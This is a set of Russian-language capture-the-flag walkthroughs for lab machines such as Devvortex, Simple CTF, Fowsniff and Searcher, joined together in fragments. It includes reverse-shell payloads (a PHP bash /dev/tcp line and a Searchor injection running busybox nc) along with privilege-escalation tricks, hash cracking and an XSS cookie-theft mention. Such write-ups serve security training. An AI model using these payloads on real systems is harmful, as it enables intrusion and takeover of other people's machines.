...
Когда мы заходим на страницу /panel/, нас встречает форма загрузки файла. Давайте попробуем загрузить файл, содержащий сценарий обратной оболочки, написанный на php. Для этой задачи мы загрузим скрипт обратной оболочки php. Я часто использую скрипт pentestmonkey php-reverse-shell.php, чтобы попытаться получить обратную оболочку с помощью netcat.  
...
У нас есть /usr/bin/python с разрешением SUID, мы попытаемся повысить наши привилегии.  
...
Теперь давайте фаззинг API-продукта VHOST.
...
Мы видим веб-страницу Laravel, если ищем «Эксплойт переадресации портов Lavarel», мы находим [https://github.com/nth347/CVE-2021-3129_exploit](https://github.com/nth347/CVE-2021-3129_exploit) . Итак, давайте попробуем это
...
Наконец, мы можем просмотреть домашний каталог пользователя root. Чтобы увидеть файлы в этом каталоге, нам нужно использовать sudo перед ls:
...
и я нашел очень интересные вещи, есть два открытых порта: 22 и 5000, порт 22 используется для ssh, но я не знал, для чего используется 5000, поэтому я искал его и нашел, что он используется для устройств upnp (принтеры, консоли, смарт-устройства). телевизоры, роутеры и т. д.) 
...
теперь мы можем красть файлы cookie администратора через xss, это довольно просто, вот полезная нагрузка, которую я использовал
...
Кажется, этот файл заслуживает внимания:
...
и не забудьте закодировать URL, чтобы все работало
...
Попробовал подключиться к машине по SSH как пользователь root с помощью команды
...
Мы видим, что на странице говорится, что во внутренней системе Fowsniff произошла утечка данных, и имена пользователей и пароли сотрудников могли быть раскрыты. Злоумышленникам также удалось захватить официальную учетную запись @fowsniffcorp в Твиттере, и через эту учетную запись злоумышленники могут раскрыть конфиденциальную информацию! Посмотрим, сделали ли они это уже :).
...
На данный момент у нас есть хэши паролей пользователей POP3. Теперь попробуем его взломать. Мы будем использовать онлайн-приложение для взлома паролей CrackStation, которое принимает хэш-пароли в качестве входных данных и пытается их взломать. Все просто: нам нужно скопировать и вставить хеши и нажать «Взломать хеш», и в случае успешного взлома вы получите простой текстовый пароль.
...
На этом этапе мы используем команду RETR 1 для получения сообщения. Это можно увидеть на следующем скриншоте.
...
Когда мы входим в систему через SSH, мы получаем баннер, похожий на тот, который содержит « cube.sh ». Поэтому мы проверяем каталог « /etc/update-motd.d/ », чтобы найти исполняемые файлы, которые могут запускать эту программу, и обнаруживаем, что файл « 00-header » запускает этот сценарий оболочки.
...
Наша версия sudo ниже 1.8.28, поэтому мы можем использовать эту машину. Используя найденный нами эксплойт, мы действительно можем создать корневую оболочку и получить наш корневой флаг.
...
Давайте сначала проверим эти имена пользователей без пароля!
...
Взломать пароль с помощью Hashcat
...
Как мы видим, внутри нашего шаблона работает несколько **PHP-** кодов. Давайте откроем любой из них и внедрим наш код для выполнения команды bash и **сохранения** изменений.

![[Pasted image 20240223231221.png]]

Запустите прослушиватель netcat на хост-компьютере, зайдите `http://dev.devvortex.htb/administrator/templates/atum/login.php` или index.php в зависимости куда вы внедрили код и дождитесь сладкой оболочки.

Выполнение обратной оболочки PHP посредством редактирования шаблона:

```php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.6/4444 0>&1'");
```

Устанавливаем соединение с помощью netcat:
...
Супер! У нас есть оболочка. Проверьте `/etc/passwd`файл, чтобы проверить, какому пользователю мы должны сначала повысить наши привилегии, а также давайте проверим `/home`каталог, так как это также может дать нам представление.

![[Pasted image 20240224001827.png]]

Хммм... `logan`звучит знакомо... Ах да, после атаки с целью кражи данных. Теперь нам нужно войти в **SSH** как `logan`. Подождите, поскольку `logan`он также является зарегистрированным пользователем на нашей панели Joomla, его пароль должен находиться в базе данных MySQL, которую мы получили ранее, верно? Думаю, есть только один способ это выяснить. Подключимся к БД и посмотрим, что получим.

Прежде чем приступить `mysql`к подключению к базе данных, давайте создадим утилиты псевдотерминала с помощью Python (поскольку `mysql`требуется взаимодействие с, это нам во всем поможет)
...
Просматривая таблицы, мы встречаем `sd4fg_users`table. Давайте выберем из него все записи и сбросим их.

![[Pasted image 20240224002230.png]]

Здесь мы видим учетные данные пользователей: `lewis`и `logan`. Отлично, давайте сохраним `logan`хеш на хост-машине и попробуем взломать его с помощью утилиты [John](https://www.kali.org/tools/john/) .

![[Pasted image 20240224002319.png]]

Вот и все, пароль для пользователя у нас есть `logan`. Давайте пройдём аутентификацию через **SSH** и зафиксируем флаг пользователя.

![[Pasted image 20240224002343.png]]

## Эскалация до root:

Теперь у нас есть доступ на уровне пользователя к серверу, нам нужно каким-то образом повысить привилегии до root и получить соответствующий флаг.

Прежде чем загружать какие-либо сценарии LinPEAS или подобные инструменты автоматизации, я настоятельно рекомендую вам использовать простую `sudo -l`команду. Поскольку мы знаем пароль, мы сможем пройти аутентификацию и проверить, можем ли мы запустить какой-либо скрипт с root-доступом.

![[Pasted image 20240224002627.png]]

Ну-ну.. Интересно. Похоже на `apport-cli`полезность. Давайте запустим его и посмотрим, с чем мы столкнемся.

![[Pasted image 20240224002640.png]]

Выглядит нормально. Может быть, проверить версию..?

**2.20.11** — напомнил мне об уязвимости, которая затрагивает **версию 2.26.0** и более ранние. Исправление коммита вы можете проверить на [их Github](https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb) . В сообщении о коммите ясно говорится, что уязвимость существует в его **пейджере** , который действует как [less](https://man7.org/linux/man-pages/man1/less.1.html) и помогает нам выйти из подсказки ввода. Типичный [GTFOBin](https://gtfobins.github.io/gtfobins/less/) . Чтобы добраться до **пейджера** , нам нужно будет «загрузить и просмотреть» отчет о сбое с помощью этого `apport-cli`инструмента. Обычно Linux сохраняет отчеты о сбоях в `/var/crash`каталоге. На момент написания этой статьи присутствует **_usr_bin_apport-cli.0.crash (не имеет особого значения, какой файл сбоя мы загружаем. Нам просто нужно добраться до** **пейджера** )

```bash
sudo /usr/bin/apport-cli -c /var/crash/_usr_bin_apport-cli.0.crash
```

После выполнения команды при появлении запроса введите `V`и подождите несколько секунд. Позвольте `apport-cli`загрузить всю свою магию.

Как только вы `:`нажмете символ, пейджер появится!

Давайте запустим `!/bin/bash`оболочку от имени пользователя root (помните, мы запустили `apport-cli`исполняемый файл с помощью `sudo`)
...
Дамы и господа, у нас есть успешно внедренная машина **Devvortex .**

**Удачной проверки пера!**
...
Простой CTF — это CTF для начинающих на TryHackMe, который демонстрирует некоторые из необходимых навыков, необходимых для всех CTF, включая сканирование и перечисление, исследование, эксплуатацию и повышение привилегий.
## Сканирование
...
Нам удалось идентифицировать три службы, работающие на целевой машине. FTP или служба протокола передачи файлов, работающая на порту 21, 80 со службой HTTP. И последнее, но не менее важное. 2222 порт, на котором работает служба. Ethernet IP-1.
## Исследование порта 21/FTP-сервиса

Из приведенных выше результатов мы видим, что «Анонимный FTP-вход разрешен», поэтому давайте войдем.

![[Pasted image 20230711152049.png]]

Выполняя поиск на FTP-сервере, мы можем найти _каталог pub_.

![[Pasted image 20230711153608.png]]

Внутри _каталога pub_ у нас есть файл с именем «ForMitch.txt». Давайте скачаем его, чтобы мы могли его прочитать, он может содержать полезную информацию!

![[Pasted image 20230711153620.png]]

![[Pasted image 20230711153627.png]]

Хм, ничего особенного, но мы знаем, что у «mitch» есть взламываемый пароль.

Из сканирования nmap мы видим, что целевая машина работает анонимно. FTP-доступ пользователя. Однако, когда мы попытались получить доступ к службе FTP, мы обнаружили, что была заметка, доступная как анонимный пользователь, и это была кроличья нора, в которую мы могли бы спуститься.

Продолжим на порту 80. Мы пытаемся просмотреть IP-адрес в браузере. , так как служба HTTP работала на машине, и мы обнаружили, что отображается рабочая страница HTTP по умолчанию в Ubuntu. При доступе к порту 80 через браузер Firefox у нас есть «страница по умолчанию Apache2 Ubuntu».

![[Pasted image 20230711154119.png]]

Ничего особенного. Поскольку у нас нет никакой другой подсказки чтобы двигаться дальше, когда мы решили выполнить атаку грубой силы на целевой машине с помощью инструмента dirb.
...
Можно сипользовать gobuster, padbuster или другие инструменты на ваш вкус.

![[Pasted image 20230711154303.png]]

![[Pasted image 20230711154325.png]]

Путем перебора каталогов мы смогли идентифицировать страницу robot.txt на целевой машине, а также каталог simple. Мы попытались просмотреть простой каталог с помощью веб-браузера и обнаружили, что на целевой машине установлена ​​CMS, сделанная простой CMS.

![[Pasted image 20230711154547.png]]

Мы видим, что файл _robots.txt_ запрещает сканирование User-agent в _каталоге /openemr-5_0_1_3_ (подробнее о robots.txt можно узнать [здесь](https://developers.google.com/search/docs/advanced/robots/create-robots-txt) ). Этот каталог вообще выходит?

![[Pasted image 20230711154609.png]]

Кажется, нет, это кролечая нора. Чтобы теперь не погрузиться в _простой_ каталог, и если мы не найдем ничего интересного, мы можем вернуться к robots.txt и подробнее изучить «openemr».

Давайте попробуем просмотреть страницу simple сейчас и посмотрим, что мы найдем.

![[Pasted image 20230711154823.png]]

Здесь мы видим, что это страница по умолчанию для чего-то под названием «CMS Made Simple», и если мы посмотрим в нижний угол, то увидим, что это версия 2.2.8.

На изображении выше мы видим, что есть ссылка «Если это ваш сайт, нажмите здесь, чтобы войти», которая может направить нас на портал входа. ИНТЕРЕС Г. Нажмите на нее.

![[Pasted image 20230711155124.png]]

Да, мы были правы. Мы нашли портал входа. Замечательно! Теперь давайте искать возможный эксплойт на CMS Made Simple. Из каталога / _simple_ мы также можем увидеть версию.

![[Pasted image 20230711155146.png]]

## Анализ уязвимости

Возвращаясь к упрощенной CMS, мы попытались найти любой возможный эксплойт с помощью searchsploit. Searchsploit смог найти уязвимость SQL-инъекций, работающую на CMS Made simple. Мы скачали эксплойт, как показано на изображении ниже.
...
Также мы можем воспользоваться Google! Давайте посмотрим, есть ли что-нибудь в Интернете об этой конкретной версии, просто зайдя в Google и выполнив поиск «CMS Made Simple 2.2.8 эксплойт».

![[Pasted image 20230711155430.png]]

Из первого результата у нас есть CVE от MITRE. Это ответ на **вопрос 3** . Если мы нажмем на ссылку, мы увидим больше информации об этом CVE. Описание дает нам ответ на **вопрос 4** .

![[Pasted image 20230711155445.png]]

Подытожим, что имеем. Мы знаем, что для CMS Made Simple 2.2.8 существует эксплойт и что у «mitch» есть взломанный пароль. Но у нас нет его пароля… пока 😏

Ещё в наших результатах мы видим страницу Exploit-DB, которая соответствует нашему запросу и относится к атаке с внедрением SQL с использованием CVE-2019–9053.

![[Pasted image 20230711161713.png]]

**3. Какой CVE вы используете против приложения?**

_CVE-2019-9053_

**4. К какой уязвимости уязвимо приложение?**

_SQLi_

## Эксплуатация

Теперь мы знаем порты, открытые на цели, представление о том, что цель использует на своем веб-сайте, и возможный эксплойт, который мы можем использовать.

Мы запустили pip для установки некоторых предварительных условий, необходимых для запуска этого конкретного эксплойта. После этого мы. Запустите эксплойт без параметра, указывающего URL целевой машины. Далее следует –crack. И -w с путем к списку слов rockyou.txt.
...
После последовательного прохождения каждого символа с различными типами записей, такими как соль, имя пользователя, адрес электронной почты, пароль и т. д., мы смогли расшифровать пароль как секретный.

![[Pasted image 20230711162758.png]]

Используя имя пользователя и пароль, которые мы обнаружили, мы теперь можем попытаться подключиться к целевой машине по SSH.
С помощью подсказки, предоставленной официальной пробной страницей Hackney, мы смогли выяснить, что служба, работающая на порту, тоже была службой SSH с помощью недавно извлеченных учетных данных для пользовательского патча, мы смогли . Войдите в систему как соответствующий пользователь через SSH. При входе в систему мы попытались просмотреть содержимое текущего каталога и обнаружили флаг пользовательской точки TXT. На машине.
...
Далее давайте проверим, есть ли у других пользователей домашние каталоги.

![[Pasted image 20230711163226.png]]

## Повышение привилегий

На привилегированную эскалацию! Сначала я предпочитаю запускать «sudo -l», чтобы посмотреть, что может запустить мой текущий пользователь.

![[Pasted image 20230711163329.png]]

Мы видим, что пользователь «mitch» может запускать /usr/bin/vim без пароля. Имея эту информацию, давайте проверим GTFOBins и посмотрим, сможем ли мы использовать это для privesc.

![[Pasted image 20230711163509.png]]

Похоже, если мы запустим эту команду, мы сможем повысить наши привилегии!

![[Pasted image 20230711163543.png]]

Это сработало! Отсюда все, что нам осталось, это взять корневой флаг, и комната готова.
...
Прежде всего нам нужно добавить в файл «/etc/hosts» имя машины:
...
nmap даёт нам вот такой результат:
...
Мы обнаружили HTTP-сервер (порт: 80):
...
Поскольку у нас нет ключа от ssh, нам больше нечего не отсаётся, переходим к странице

![[Pasted image 20230708072421.png]]

Внимательно посматрите на страницу, нечего не находите?

![[Pasted image 20230708073011.png]]

Да, даже обошлись без исходника, хотя если туда заглянем:

![[Pasted image 20230708073240.png]]

При тестировании функции поиска он отправляет два параметра «движок» и «запрос»; и я пордумал что это может быть SSTI.

Из этой информации нижнего колонтитула мы находим используемую версию «Searchor» (2.4.0).

Информация дает нам отличную точку для начала. Мы знаем инструменты, которые использует веб-страница, а также проверяем версию технологии. Нам нужно проверить, есть ли уязвимости.


## Анализ уязвимости

Немного использовали различные полезные нагрузки SSTI но не сработало, поисав в интернете мы поняли что у  «Searchor» (2.4.0) есть уязвимость. После некоторых исследований я обнаружил, что эта версия Searchor имеет недостаток выполнения произвольного кода.
...
Мы можем по разному эксплуатировать и получить доступ к оболочке. Мы можем отправить вот такой POST-запрось:

```
engine=Accuweather&query=example'),__import__('os').system('busybox nc 10.10.16.15 4444 -e /bin/sh')#
```

Конечно же укажем свой IP-адрес, и прежде всего запустим команду:

```
nc -nvlp 4444
```

Запрось кидайте как угодно не важно. Можно напрямую (`'),__import__('os').system('busybox nc 10.10.16.15 4444 -e /bin/sh')#`),
или burp и даже панель разработчика в бравзере.

![[Pasted image 20230708111301.png]]

Если просмотрим репозиторию пользователя GitHub jonnyzar ' [POC-Searchor-2.4.2](https://github.com/jonnyzar/POC-Searchor-2.4.2) '.

![[Pasted image 20230708111901.png]]

Это отмечает, что этот эксплойт работает для «Searchor» <= 2.4.2 и 2.4.0. Он также предлагает код эксплойта для отправки в качестве запроса для RCE, удобно.
...
Код выше вернет нам обратную оболочку. 
...
Также в github можно найти коды и скрипты которые используют этот уязвимость чтобы облегчить задачу можно сипользовать их.

После получение обратной оболочки нужно найти флаги. Наш первый флаг находится в файле user.txt путь который /home/svc/user.txt:
...
Давайте перечислим катологи

![[Pasted image 20230708123423.png]]

Здесь я мало что получил, но я обнаружил скрытый файл в моем домашнем каталоге для git. На этом этапе ваша рефлексивная команда ls должна быть ls -al, чтобы обнаружить эти скрытые каталоги. В папке /var/www/app введём команду ls -al:

![[Pasted image 20230708123516.png]]

В каталоге приложений `/var/www/app` Eсть `.git` каталог для изучения. 

мы получили некоторую информацию в журналах и файлах конфигурации.
...
у нас есть пользователь с именем **администратор** и субдомен **gitea.searcher.htb** 

Если по каким то причинам у вас это команда не сработал, то можно проверить вручну:
...
Файлы логов git находятся в папке .git внутри корневой директории вашего репозитория. Он называется logs и содержит различные файлы журналов, включая reflog, HEAD, и логи для каждой ветки репозитория.

Давайте загляним файл конфиг:
...
У нас есть еще один пользователь по имени **Cody** и его пароль на **поддомене @gitea.searcher.htb**

Переходим по этому домену, но сначало нужно его включить в списоке хостов. Отредактируйте файл /etc/hosts и добавьте субдомен в файл.

![[Pasted image 20230708151207.png]]

Войти с учетными данными Cody на сайт.

![[Pasted image 20230708151243.png]]

Мы ничего не получили от учетной записи, но пароль, который мы нашли для Коди, повторно используется в качестве учетной записи svc той же учетной записи, для которой мы получили Shell. Другими словами, я решил попробовать это на sudo для учетной записи svc, к которой у меня есть доступ, потому что в системе нет учетной записи с именем cody. Итак, я делаю попытку и…
...
Есть скрипт, который я могу запустить как root! Ура!

Поскольку у меня есть пароль и порт ssh открыт, я попытаюсь войти туда, чтобы получить лучшую оболочку. ЭТО РАБОТАЕТ.

![[Pasted image 20230709015639.png]]

Это упростит задачу. Я возвращаюсь к этому сценарию и пытаюсь запустить его произвольно, чтобы посмотреть, что произойдет. Интересный. Давайте посмотрим, что делает этот скрипт:

```
sudo -S /usr/bin/python3 /opt/scripts/system-checkup.py random
```

Мы видим, что запускаем скрипт system-checkup.py от имени пользователя root. Хм, этот скрипт не читается, только исполняемый; Мы проверим это.

![[Pasted image 20230710062126.png]]

Тестирование каждой разрешенной подкоманды.
...
Мы видим что эти два контейнера, запущенные на машине. На одном работает сервер gitra, а на другом - сервер MySQL.

Проверяем команду **docker-inspect**:
...
Нас просять чтобы мы указали формат.

Проверка команды **full-checkup**:
...
Нам говорять что что-то пошло не так!

Окей, из этих субкомманды выделяется **docker-inspect**. Чтобы использовать команду **docker-inspect**, нам нужно определить формат и имя контейнера. Немного поискав в интернете находим:

![[Pasted image 20230710065205.png]]

У нас получается вот такой синтаксис:
...
_сброс данных контейнера gitea_
...
Чтобы была удобнее анализировать наш вывод можем воспользоваться специальным сервисом

![[Pasted image 20230710081651.png]]
https://jsonformatter.org/json-pretty-print

отмечая многое в _дампе gitea_, но нечего польезного там не нашлию _Сброс данных контейнера MySQL_:
...
у нас есть несколько паролей в этом дампе

![[Pasted image 20230710083536.png]]

ну ничего особенного в базе данных MySQL нет

![[Pasted image 20230710083554.png]]

мы получили ошибку в этом файле. Мы можем попробовать войти в gitra с этими учетными данными как администратор

![[Pasted image 20230710083647.png]]

мы можем войти в систему как администратор с паролем, который мы нашли в дампе MySQL

![[Pasted image 20230710083711.png]]

у нас есть несколько сценариев, которые мы запускаем, мы не можем изменить содержимое сценария.  С этими учетными данными мы можем получить доступ к репозиторию администратора, где мы, наконец, находим исходный код скриптов Python, которые мы обнаружили ранее в `/opt/scripts` каталог. Это позволяет нам изучить код и потенциально определить любые уязвимости или слабые места, которые могут быть использованы для получения дальнейшего доступа к системе. В репозитории мы находим несколько файлов, один из которых мы можем запустить как **root** .  

Помните подкоманду «full-checkup», которая завершилась ошибкой? Что ж, теперь мы можем изучить его и то, как он пытается выполниться.  Ценарий `system-checkup.py` особенно интересен. Изучив код, я обнаружил, почему он возвращал сообщение «Что-то пошло не так» при предыдущем запуске. Что еще более важно, я также определил потенциальную уязвимость, которую можно использовать для получения корневого шелла в системе.

Заглянув исходный код, мы увидим код **system-checkup.py**, мы увидим, что полный путь к **full-check.py** не определен в скрипте
...
поэтому его можно запустить, только если мы находимся в том же каталоге, что и скрипт **full-checkup.sh**. Он находится в каталоге **/opt/scripts** как нам показала команда `sudo -l`

![[Pasted image 20230710085644.png]]

посмотрите как это работает если мы находимся в каталоге сценария, а что, если мы создадим собственный скрипт и запустим его
создать оболочку rev в python bash не получится
...
сохраните его как full-checkup.sh и разместить его на сервере Python
...
скопируйте ссылку на файл и запустить прослушиватель NC

![[Pasted image 20230710091226.png]]

затем выполните эту команду в доступном для записи каталоге /tmp
...
Скрипт использует относительный путь к **full-checkup.sh**. Это дает возможность эксплуатировать систему, создавая пользовательский **full-checkup.sh**

Из того, что мы видим в сценарии, если мы создадим файл с именем full-checkup.sh, он выполнит его, поскольку сначала будет искать, существует ли он в том пути, где мы находимся.

Мы создаем файл в bash, чтобы изменить разрешения bash на SUID.
...
Мы даем ему разрешение и выполняем скрипт, передавая ему имя файла, созданного для того, чтобы стать root и иметь возможность читать флаг.
...
Итак, все, что нам нужно сделать, это создать скрипт в доступном для записи каталоге с именем «full-checkup.sh», и мы можем поместить внутрь нашу обратную оболочку для повышения привилегий root.
...
Сначало конечно же вы дожны слушать определённый порт:

```bash
nc -nvlp <port>
```

И запустить в машине:
...
Выполнение полезной нагрузки подкоманды «полная проверка».
...
Обратный шелл отловил и собрал 'root.txt'.

Теперь у нас есть «root.txt».

**Способ №4**

После поиска какой-либо проблемы в исходном коде мы видим, что действие «полная проверка» выполняет скрипт «./full-checkup.sh» с относительным путем, затем нам нужно создать новый скрипт с нашим обратным кодом оболочки и выполнить скрипт в том же каталоге:
...
После создания нашей обратной оболочки и выполнения скрипта с привилегиями sudo мы получим новое соединение через наш сервер netcat:
